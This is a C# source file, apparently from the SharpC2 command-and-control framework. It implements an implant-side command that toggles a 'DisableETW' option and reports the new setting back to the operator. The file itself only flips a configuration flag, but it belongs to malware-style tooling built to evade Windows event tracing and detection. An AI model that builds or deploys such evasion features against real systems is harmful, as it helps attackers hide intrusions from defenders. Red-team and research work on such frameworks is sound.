using Agent.Models;
using Agent.Common;
using Agent.Controllers;

namespace Agent.Commands
{
    internal class Etw
    {
        public static void SetConfig(string data, AgentController agent, ConfigController config)
        {
            if (!string.IsNullOrEmpty(data) && bool.TryParse(data, out bool disable))
            {
                config.SetOption(ConfigurationSettings.DisableETW, disable);
            }
            else
            {
                agent.SendError("stageone", "disableetw", "Argument is not of type bool");
                return;
            }

            var result = new SharpC2ResultList<DisableEtwSetting>
            {
                new DisableEtwSetting
                {
                    Disabled = (bool)config.GetOption(ConfigurationSettings.DisableETW)
                }
            };

            agent.SendCommandOutput(result.ToString());
        }
    }
}